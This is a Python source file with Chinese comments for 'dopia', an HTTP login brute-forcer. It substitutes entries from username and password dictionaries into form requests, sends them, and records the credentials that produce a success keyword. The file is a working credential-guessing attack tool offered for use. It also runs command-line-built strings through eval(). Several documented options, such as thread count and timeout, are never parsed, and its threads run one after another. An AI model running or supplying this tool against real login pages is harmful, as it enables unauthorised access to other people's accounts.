#一个简单的HTTP爆破程序~
import sys
import getopt
from typing import Iterator
import requests
import threading
import queue
import time

VERSION="v0.1"

#------------------------------------------
#by AugustTheodor 2021.9.22
#~~参数说明~~
#-l login 提供一个用户名，对应表单里的^login^
#-p password 提供一个密码，对应表单里的^PASSWORD^
#-L LOGINTEXT 提供一个以换行符为分隔符的用户名字典
#-P PASSWORDTEXT 提供一个以换行符为分隔符的密码字典
#-d detail 显示所有细节
#-n 设置线程数，默认为20
#-t 设置超时时间，默认为5s  
#-o 设置输出到的文件
#-e 设置判断出登陆异常时存放异常输出的文件，默认为dopia_error.log
#-f 设置在第一次异常之后即终止爆破
#-v 版本
#
#-h/--help 帮助
#--get 声明为get
#--post 声明为post
#  两个方法的参数都{opt1:value1,opt2:value2}的形式提交（其实就是手写字典），请用双引号扩住参数。
#--success 一个文本，保证登陆成功界面包含此文本
#--failure 一个文本，保证登陆失败界面包含此文本 
# 建议两个值都写出，这样可以判断是否发生了意料之外的情况。 
# 
#--header 指定要携带的头文件 必须要以键值对的形式存在（只要复制一下请求头到文件内就行）
#service 要爆破的url
#------------------------------------------

def dopia_help(): #帮助说明
    print('''
#--------------------------------------#
#-----------   dopia   ----------------#
#--------------------------------------#    ''')
    time.sleep(0.2)
    print('''
~~~~~~~~~~参数说明~~~~~~~~~~
-l login 提供一个用户名，对应表单里的^LOGIN^
-p password 提供一个密码，对应表单里的^PASSWORD^
-L LOGINTEXT 提供一个以换行符为分隔符的用户名字典
-P PASSWORDTEXT 提供一个以换行符为分隔符的密码字典
-d detail 显示所有细节
-n 设置线程数，默认为20
-t 设置超时时间，默认为5s  
-o 设置输出到的文件
-e 设置判断出登陆异常时存放异常输出的文件，默认为dopia_error.log
-f 设置在第一次异常之后即终止爆破
-h/--help 帮助
--get 声明为get
--post 声明为post
::::::两个方法的参数都{opt1:value1,opt2:value2}的形式提交（其实就是手写字典），请用双引号扩住参数。
--success 一个文本，保证登陆成功界面包含此文本
--failure 一个文本，保证登陆失败界面包含此文本 
::::::建议两个值都写出，这样dopia可以判断是否发生了意料之外的情况。 
--header 指定要携带的头文件 必须要以键值对的形式存在（只要复制一下请求头到文件内就行）
service 要爆破的url
    ''')

def generator(filename): #大文件字典作为生成器
    try: 
        with open(filename) as raw:
            return iter(raw.readlines())
    except:
        print("打开字典文件{0}时发生错误。".format(filename))

def set_header(header): #设置头字典
    with open(header,"r") as f:
        return dict([line.split(": ",1) for line in f.read().split("\n")])

class dopiaThread(): #爆破线程类
    dopia_thread_queue=queue.Queue() 
    dopia_thread_count=0 #总运行编号，指的是此文件本次运行时创建的线程数量
    dopia_success_count=0 #成功数
    dopia_failure_count=0 #失败数
    dopia_error_count=0 #出错数
    dopia_max_count=20 #允许的最大线程数
    def __init__(self):
        self.lock=threading.Lock() #线程锁
        self.run()

    def run(self):
        while True:
            if dopiaThread.dopia_thread_queue.empty():
                break #豆执行完了
            target,text=dopiaThread.dopia_thread_queue.get()
            word_judge=""
            response=eval(target) #执行读取操作
            if detail:
                print("--{0}：".format(dopiaThread.dopia_thread_count),end="")
            if(response==None):
                dopiaThread.dopia_thread_count+=1
                print("请求超时。")
                return
            if not success_word=="":
                if success_word in response.text:
                    dopiaThread.dopia_success_count+=1
                    word_judge+="success"
                    if detail:
                        print("登陆成功！service {0}，{1}".format(service[0],text))
                    else:
                        print(text) #没有显示细节就只输出正确的口令
                    self.lock.acquire()
                    output.write(text+"\n") #只有登陆成功时写入
                    self.lock.release()
            if not failure_word=="":
                if failure_word in response.text:
                    word_judge+="failure"
                    dopiaThread.dopia_failure_count+=1
                    if detail:
                        print("登陆失败，service {0}，{1}".format(service[0],text))
            if word_judge=="" and not failure_word=="": #三目运算符大失败
                dopiaThread.dopia_failure_count+=1
                if detail:
                    print("登陆失败，service {0}，{1}".format(service[0],text))
            elif word_judge=="" and not success_word=="":
                dopiaThread.dopia_success_count+=1
                if detail:
                    print("登陆成功！service {0}，{1}".format(service[0],text))
                else:
                    print(text) #没有显示细节就只输出正确的口令
                self.lock.acquire()
                output.write(text+"\n") #只有登陆成功时写入
                self.lock.release()
            elif word_judge=="" and 'failure_word' in locals().keys() and 'success_word' in locals().keys(): #同时存在正确和失败词
                dopiaThread.dopia_error_count+=1
                self.lock.acquire()
                errorput.write("Error in {0} and {1}\n{2}\n".format(service,text,response.text))
                self.lock.release()
                if first_exit: dopiaThread.dopia_thread_queue=queue.Queue() #清空queue
                print("登陆发生异常，此登陆的返回值存储在{0}".format(error))
            dopiaThread.dopia_thread_count+=1

#-----------------------------------------------
#正文部分
detail=False #显示细节
first_exit=False #第一次报错时终止
timeout=5 #超时时间
maxthread=20 #最大同时线程数
error="dopia_error.log" #报错输出，考虑到报错直接在终端显示太扎眼了。
header="" #可以指定头部
success_word=""
failure_word=""
try:
    args=sys.argv #获取命令行输入的参数
    try:
        options,service=getopt.getopt(args[1:],"l:p:L:P:do:hv",["get=","post=","success=","failure=","header=","help"])
    except:
        print("输入语义有误，请使用-h或--help命令查看帮助。")
        exit()
    try: #不知道为啥有时候会漏啊- -
        options
    except:
        print("输入命令有误，请使用-h或--help命令查看帮助。")
        exit()    
    for enum,value in options: #为什么不支持switch？
        if enum=='-l':
            login=[value].__iter__()
        if enum=="-p":
            password=[value].__iter__()
        if enum=="-L":
            login=generator(value)
        if enum=="-P":
            password=generator(value)
        if enum=="-d":
            detail=True
        if enum=="-o":
            try:
                output=open(value,"w")
            except:
                print("打开输出文件{0}时发生错误。".format(value))
        if enum=="-h":
            dopia_help()
            exit()
        if enum=="-v":
            print("dopia 版本{0}".format(VERSION))
            exit()
        if enum=="--get":
            method_name="get"
            method=value
        if enum=="--post":
            method_name="post"
            method=value
        if enum=="--success":
            success_word=value
        if enum=="--failure":
            failure_word=value
        if enum=="--header":
            header=set_header(value)
        if enum=="--help":
            dopia_help()
            exit()
    try: #检查是否所有必要参数都输入了
        login
        password
        method
        service[0]
        method_name
        output
    except:
        print("参数读取中发生问题，请检查是否输入了所有需要的参数。")
    if((not 'failure_word' in locals().keys()) and (not 'success_word' in locals().keys())):
        #两个都没有输入
        print("请输入任意成功关键词或者失败关键词！")
        exit(0)
    try:
        errorput=open(error,"w")
    except:
        print("打开报错文件{0}时发生错误。".format(error)) #可以写个报错类了
        exit(0)
    #检查完毕，正式开始
    print("dopia开始运行，service：{0}，超时时间：{1}，线程数：{2}，显示细节：{3}，报错终止：{4}".format(service[0],timeout,maxthread,detail,first_exit))
    argfunc="requests.{3}('{0}',data={1},timeout={2},headers={4})" #被执行的函数
    while True: #很明显，这是先遍历了login再遍历password
        try:
            loginnext=login.__next__().replace("\n","") #本来可以切片，但是有只输入一个值的情况
            while True:
                try:
                    passwordnext=password.__next__().replace("\n","")
                    funcnext=method.replace("^LOGIN^",loginnext)
                    funcnext=funcnext.replace("^PASSWORD^",passwordnext)
                    funcnext=eval(funcnext)
                    dopiaThread.dopia_thread_queue.put([argfunc.format(service[0],funcnext,timeout,method_name,header),"login:{0} password:{1}".format(loginnext,passwordnext)])
                except StopIteration:
                    break
        except StopIteration:
            break
    for i in range(0,maxthread): #生成线程
        dopiaThread()
    print("爆破结束。已经执行口令：{0}，成功：{1}，失败：{2}，异常：{3}。".format(dopiaThread.dopia_thread_count,dopiaThread.dopia_success_count,dopiaThread.dopia_failure_count,dopiaThread.dopia_error_count))
except KeyboardInterrupt:
    print("检测到键盘中断，爆破终止。已经执行口令：{0}，成功：{1}，失败：{2}，异常：{3}。".format(dopiaThread.dopia_thread_count,dopiaThread.dopia_success_count,dopiaThread.dopia_failure_count,dopiaThread.dopia_error_count))

